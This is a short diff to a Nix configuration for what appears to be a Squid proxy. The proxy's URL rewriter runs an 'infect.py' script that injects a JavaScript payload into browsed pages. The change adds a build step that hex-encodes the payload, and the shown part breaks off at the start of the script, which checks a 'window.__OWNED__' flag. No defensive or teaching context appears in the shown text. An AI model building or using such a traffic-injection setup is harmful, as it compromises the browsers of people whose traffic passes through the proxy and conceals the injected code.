@@ -39,7 +39,15 @@ let
     url_rewrite_program ${pkgs.python3}/bin/python ${./infect.py} ${payload} /var/quarantine 13337
   '';
 
-  payload = builtins.toFile "payload.js" ''
+  payload = pkgs.stdenv.mkDerivation {
+    name = "payload.js";
+    builder = pkgs.writeText "builder.sh" ''
+      . $stdenv/setup
+      ${pkgs.python3}/bin/python3 ${./jshex.py} < ${rawPayload} > $out
+    '';
+  };
+
+  rawPayload = pkgs.writeText "rawPayload.js" ''
     (function(){
       function payload() {
         if (!window.__OWNED__) {
